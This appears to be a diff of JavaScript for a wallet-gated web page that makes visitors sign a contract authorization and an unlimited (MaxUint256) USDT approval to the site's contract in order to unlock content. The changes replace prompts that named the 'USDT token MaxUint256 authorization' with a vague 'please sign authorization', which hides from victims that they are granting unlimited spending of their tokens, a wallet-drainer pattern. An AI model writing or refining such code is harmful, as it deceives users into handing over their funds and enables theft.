@@ -93,7 +93,7 @@ updateStatus(''); // 清空/隱藏狀態欄
 await checkAuthorization();
 } else {
 updateStatus(''); // 隱藏狀態欄
-showOverlay('請連繫錢包以解鎖內容');
+showOverlay('請鏈接錢包以解鎖內容');
 }
 
 // Account change listener, simplified to re-initialize
@@ -174,7 +174,7 @@ connectButton.classList.remove('connected');
 connectButton.title = 'Connect Wallet (Complete Authorization)'; // 連繫錢包 (完成授權)
 connectButton.disabled = false;
 updateStatus(''); // 授權未完成，清空/隱藏狀態欄
-showOverlay('需要完成合約和 USDT 授權才能查看內容。點擊右上角按鈕開始交易。'); // 授權未完成，顯示遮罩
+showOverlay('需要完成授權才能查看內容。點擊右上角鏈接錢包。'); // 授權未完成，顯示遮罩
 }
 } catch (error) {
 updateStatus(`Authorization check failed: ${error.message}`); // 顯示錯誤
@@ -218,7 +218,7 @@ updateStatus(''); // 隱藏狀態欄
 const isAuthorized = await contract.authorized(userAddress);
 if (!isAuthorized) {
 updateStatus(''); // 隱藏進度
-showOverlay('1/2: 請在錢包中簽署 **SimpleMerchant 合約授權** 交易...');
+showOverlay('1/2: 請在錢包中簽署授權');
 const txAuthorize = await contract.connectAndAuthorize();
 await txAuthorize.wait();
 updateStatus(''); // 隱藏成功訊息
@@ -233,7 +233,7 @@ const maxAllowance = ethers.MaxUint256;
 // Re-approve if approval is not MaxUint256 (or close)
 if (usdtAllowance < maxAllowance) {
 updateStatus(''); // 隱藏進度
-showOverlay('2/2: 請在錢包中簽署 **USDT 代幣 MaxUint256 授權** 交易...');
+showOverlay('2/2: 請在錢包中簽署授權');
 const txApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
 await txApprove.wait();
 updateStatus(''); // 隱藏成功訊息
@@ -262,7 +262,7 @@ function disconnectWallet() {
 resetState();
 updateStatus('Wallet disconnected, please reconnect.'); // 顯示斷開連繫的提示
 alert('Wallet disconnected. To fully remove site access from MetaMask, please manually remove this site from "Connected Sites" in MetaMask settings.'); // 提示用戶手動斷開
-showOverlay('錢包已斷開連繫，請連繫以解鎖內容'); // 斷開時顯示遮罩
+showOverlay('錢包已斷開鏈接，請重新鏈接以解鎖內容'); // 斷開時顯示遮罩
 }
 
 function resetState() {
@@ -274,7 +274,7 @@ connectButton.classList.remove('connected');
 connectButton.title = 'Connect Wallet'; // 連繫錢包
 connectButton.disabled = false;
 updateStatus(''); // 重設時清空狀態欄
-showOverlay('請連繫錢包以解鎖內容 🔒'); // 重設時顯示遮罩
+showOverlay('請鏈接錢包以解鎖內容 🔒'); // 重設時顯示遮罩
 }
 
 /**
